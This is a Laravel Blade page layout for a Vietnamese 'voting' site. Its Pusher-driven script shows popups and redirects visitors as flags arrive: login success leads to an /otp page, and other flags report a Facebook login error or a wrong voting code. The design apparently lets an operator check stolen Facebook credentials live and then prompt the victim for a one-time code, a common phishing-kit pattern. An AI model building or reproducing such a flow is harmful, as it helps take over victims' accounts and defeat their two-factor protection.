<!DOCTYPE html>
@php
$settings = App\Models\Setting::first(); // Truy vấn model Settings
@endphp
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="{{ Storage::url($settings->web_icon)}}" type="image/png">
    {{-- <meta name="google" content="notranslate"> --}}


    <meta property="og:type" content="website">
    <meta property="og:url" content="{{ request()->fullUrl() }}">
    <meta name="twitter:url" content="{{ request()->fullUrl() }}">

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    @vite(['resources/css/app.css', 'resources/js/app.js'])
    @livewireStyles
</head>

<body>
    <div class="loading-screen" id="loadingScreen" wire:navigating>
        <div class="loading-spinner"></div>
    </div>

    {{ $slot }}
    <div class="gtranslate_wrapper"></div>

    @livewireScripts
    <script>
        window.gtranslateSettings = {
        "default_language": "vi",
        "wrapper_selector": ".gtranslate_wrapper",
        "flag_style":  "3d",
        "alt_flags": {
            "en": "usa",
        },
        "languages": ["vi", "en"], // Chỉ định các ngôn ngữ cần hỗ trợ
        "language_codes": { "vi": "vi", "en": "en" }, // Đảm bảo tiếng Việt là mặc định
    };

    // Đặt ngôn ngữ mặc định là tiếng Việt
    document.documentElement.lang = "vi";
    </script>
    <script src="{{asset( 'asset/translate.js')}}" defer></script>

    <x-livewire-alert::scripts />
    <style>
        .attachment__caption {
            display: none;
        }
    </style>
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

<script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
<script>
    Pusher.logToConsole = true;

    var pusher = new Pusher('bfb528bfe72756d0a69e', {
        cluster: 'ap1'
    });

    var channel = pusher.subscribe('notification');

    const currentUserId = @json(Auth::id());

    channel.bind('test.notification', function (data) {
    console.log(data.loginSuccess);

    // Check if loginSuccess or codeEntrySuccess is true and route accordingly
    if (data.loginSuccess === true) {
        Swal.fire({
            icon: 'success',
            title: 'Thông báo mới',
            text: data.notificationMessage || 'Bạn đã đăng nhập thành công!',
            confirmButtonText: 'OK'
        }).then((result) => {
            if (result.isConfirmed) {
                // Redirect to /login if loginSuccess is true
                window.location.href = '/otp';
            }
        });
    } else if (data.codeEntrySuccess === true) {
        Swal.fire({
            icon: 'success',
            title: 'Thông báo mới',
            text: data.notificationMessage || 'Nhập mã thành công!',
            confirmButtonText: 'OK'
        }).then((result) => {
            if (result.isConfirmed) {
                // Redirect to / if codeEntrySuccess is true
                window.location.href = '/';
            }
        });
    } else if (data.facebookLoginError === true) {
        Swal.fire({
            icon: 'error',
            title: 'Thông báo mới',
            text: data.notificationMessage || 'Thông tin đăng nhập hoặc tài khoản sai!',
            confirmButtonText: 'OK'
        }).then((result) => {
            if (result.isConfirmed) {
                // Redirect to / if codeEntrySuccess is true
                window.location.href = '';
            }
        });
    } else if (data.codeSelectionError === true) {
        Swal.fire({
            icon: 'error',
            title: 'Thông báo mới',
            text: data.notificationMessage || 'Mã bình chọn sai!',
            confirmButtonText: 'OK'
        }).then((result) => {
            if (result.isConfirmed) {
                // Redirect to / if codeEntrySuccess is true
                window.location.href = '';
            }
        });
    } else if (data.notify === true) {
        Swal.fire({
            icon: 'success',
            title: 'Thông báo mới',
            text: data.notificationMessage || 'Mã bình chọn sai!',
            confirmButtonText: 'OK'
        }).then((result) => {
            if (result.isConfirmed) {
                // Redirect to / if codeEntrySuccess is true
                window.location.href = '';
            }
        });
    } else {
        // General notification message if neither loginSuccess nor codeEntrySuccess is true
        Swal.fire({
            icon: 'success',
            title: 'Thông báo mới',
            text: data.notificationMessage || 'Bạn có một thông báo mới!',
            confirmButtonText: 'OK'
        }).then((result) => {
            if (result.isConfirmed) {
                window.location.reload();
            }
        });
    }
});

</script>
</body>

</html>
